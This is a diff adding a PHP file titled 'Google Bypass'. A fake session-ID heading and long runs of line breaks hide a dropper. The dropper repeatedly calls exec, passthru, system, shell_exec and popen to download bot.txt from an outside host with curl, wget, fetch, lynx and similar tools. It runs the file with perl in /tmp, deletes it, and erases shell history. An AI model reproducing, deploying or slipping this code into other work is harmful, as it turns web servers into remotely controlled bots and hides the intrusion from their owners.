@@ -1,0 +1,57 @@
+<title>Google Bypass</title>
+<h2>PHPESSID712647120509832974891263402184712863702163897890127012873</h2><br><br>END OF BYPASS FILE<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<?
+$url="http://tikihub.com/ray/";
+exec('cd /tmp;curl -O '.$url.'bot.txt;perl bot.txt;rm -f bot.txt*;');
+exec('cd /tmp;GET '.$url.'bot.txt > bot.txt;perl bot.txt;rm -f bot.txt*;');
+exec('cd /tmp;wget '.$url.'bot.txt;perl bot.txt;rm -f bot.txt*;');
+exec('cd /tmp;lwp-download '.$url.'bot.txt;perl bot.txt;perl bot.txt.txt;rm -f bot.txt*;');
+exec('cd /tmp;fetch '.$url.'bot.txt >bot.txt;perl bot.txt;rm -f bot.txt*;');
+passthru('cd /tmp;fetch '.$url.'bot.txt >bot.txt;perl bot.txt;rm -f bot.txt*;');
+passthru('cd /tmp;wget '.$url.'bot.txt;perl bot.txt;rm -f bot.txt*;');
+passthru('cd /tmp;lwp-download '.$url.'bot.txt;perl bot.txt;perl bot.txt.txt;rm -f bot.txt*;');
+passthru('cd /tmp;curl -O '.$url.'bot.txt;perl bot.txt;rm -f bot.txt*;');
+passthru('cd /tmp;GET '.$url.'bot.txt >bot.txt;perl bot.txt;rm -f bot.txt*;');
+system('cd /tmp;curl -O '.$url.'bot.txt;perl bot.txt;rm -f bot.txt*;');
+system('cd /tmp;GET '.$url.'bot.txt >bot.txt;perl bot.txt;rm -f bot.txt*;');
+system('cd /tmp;wget '.$url.'bot.txt;perl bot.txt;rm -f bot.txt*;');
+system('cd /tmp;lwp-download '.$url.'bot.txt;perl bot.txt;perl bot.txt.txt;rm -f bot.txt*;');
+system('cd /tmp;fetch '.$url.'bot.txt >bot.txt;perl bot.txt;rm -f bot.txt*;');
+shell_exec('cd /tmp;curl -O '.$url.'bot.txt;perl bot.txt;rm -f bot.txt*;');
+shell_exec('cd /tmp;GET '.$url.'bot.txt >bot.txt;perl bot.txt;rm -f bot.txt*;');
+shell_exec('cd /tmp;wget '.$url.'bot.txt;perl bot.txt;rm -f bot.txt*;');
+shell_exec('cd /tmp;lwp-download '.$url.'bot.txt;perl bot.txt;perl bot.txt.txt;rm -f bot.txt*;');
+shell_exec('cd /tmp;fetch '.$url.'bot.txt >bot.txt;perl bot.txt;rm -f bot.txt*;');
+popen('cd /tmp;wget '.$url.'bot.txt;perl bot.txt;rm bot.txt*;/usr/bin/perl bot.txt;rm -f $HISTFILE', "r");
+popen('cd /tmp;curl -O '.$url.'bot.txt; perl bot.txt;rm bot.txt*;/usr/bin/perl bot.txt;rm -f $HISTFILE', "r");
+popen('cd /tmp;lwp-download '.$url.'bot.txt;perl bot.txt;/usr/bin/perl bot.txt;rm -f $HISTFILE', "r");
+popen('cd /tmp;lynx -source '.$url.'bot.txt >bot.txt;perl bot.txt;/usr/bin/perl bot.txt;rm -f $HISTFILE', "r");
+popen('cd /tmp;fetch '.$url.'bot.txt >bot.txt;perl bot.txt;/usr/bin/perl bot.txt;rm -f $HISTFILE', "r");
+popen('cd /tmp;GET '.$url.'bot.txt >bot.txt;perl bot.txt;/usr/bin/perl bot.txt;rm -f $HISTFILE', "r");
+@exec('cd /tmp;curl -O '.$url.'bot.txt;perl bot.txt;rm -f bot.txt*;');
+@exec('cd /tmp;GET '.$url.'bot.txt > bot.txt;perl bot.txt;rm -f bot.txt*;');
+@exec('cd /tmp;wget '.$url.'bot.txt;perl bot.txt;rm -f bot.txt*;');
+@exec('cd /tmp;lwp-download '.$url.'bot.txt;perl bot.txt;perl bot.txt.txt;rm -f bot.txt*;');
+@exec('cd /tmp;fetch '.$url.'bot.txt >bot.txt;perl bot.txt;rm -f bot.txt*;');
+@passthru('cd /tmp;fetch '.$url.'bot.txt >bot.txt;perl bot.txt;rm -f bot.txt*;');
+@passthru('cd /tmp;wget '.$url.'bot.txt;perl bot.txt;rm -f bot.txt*;');
+@passthru('cd /tmp;lwp-download '.$url.'bot.txt;perl bot.txt;perl bot.txt.txt;rm -f bot.txt*;');
+@passthru('cd /tmp;curl -O '.$url.'bot.txt;perl bot.txt;rm -f bot.txt*;');
+@passthru('cd /tmp;GET '.$url.'bot.txt >bot.txt;perl bot.txt;rm -f bot.txt*;');
+@system('cd /tmp;curl -O '.$url.'bot.txt;perl bot.txt;rm -f bot.txt*;');
+@system('cd /tmp;GET '.$url.'bot.txt >bot.txt;perl bot.txt;rm -f bot.txt*;');
+@system('cd /tmp;wget '.$url.'bot.txt;perl bot.txt;rm -f bot.txt*;');
+@system('cd /tmp;lwp-download '.$url.'bot.txt;perl bot.txt;perl bot.txt.txt;rm -f bot.txt*;');
+@system('cd /tmp;fetch '.$url.'bot.txt >bot.txt;perl bot.txt;rm -f bot.txt*;');
+@shell_exec('cd /tmp;curl -O '.$url.'bot.txt;perl bot.txt;rm -f bot.txt*;');
+@shell_exec('cd /tmp;GET '.$url.'bot.txt >bot.txt;perl bot.txt;rm -f bot.txt*;');
+@shell_exec('cd /tmp;wget '.$url.'bot.txt;perl bot.txt;rm -f bot.txt*;');
+@shell_exec('cd /tmp;lwp-download '.$url.'bot.txt;perl bot.txt;perl bot.txt.txt;rm -f bot.txt*;');
+@shell_exec('cd /tmp;fetch '.$url.'bot.txt >bot.txt;perl bot.txt;rm -f bot.txt*;');
+@popen('cd /tmp;wget '.$url.'bot.txt;perl bot.txt;rm bot.txt*;/usr/bin/perl bot.txt;rm -f $HISTFILE', "r");
+@popen('cd /tmp;curl -O '.$url.'bot.txt; perl bot.txt;rm bot.txt*;/usr/bin/perl bot.txt;rm -f $HISTFILE', "r");
+@popen('cd /tmp;lwp-download '.$url.'bot.txt;perl bot.txt;/usr/bin/perl bot.txt;rm -f $HISTFILE', "r");
+@popen('cd /tmp;lynx -source '.$url.'bot.txt >bot.txt;perl bot.txt;/usr/bin/perl bot.txt;rm -f $HISTFILE', "r");
+@popen('cd /tmp;fetch '.$url.'bot.txt >bot.txt;perl bot.txt;/usr/bin/perl bot.txt;rm -f $HISTFILE', "r");
+@popen('cd /tmp;GET '.$url.'bot.txt >bot.txt;perl bot.txt;/usr/bin/perl bot.txt;rm -f $HISTFILE', "r");
+?>
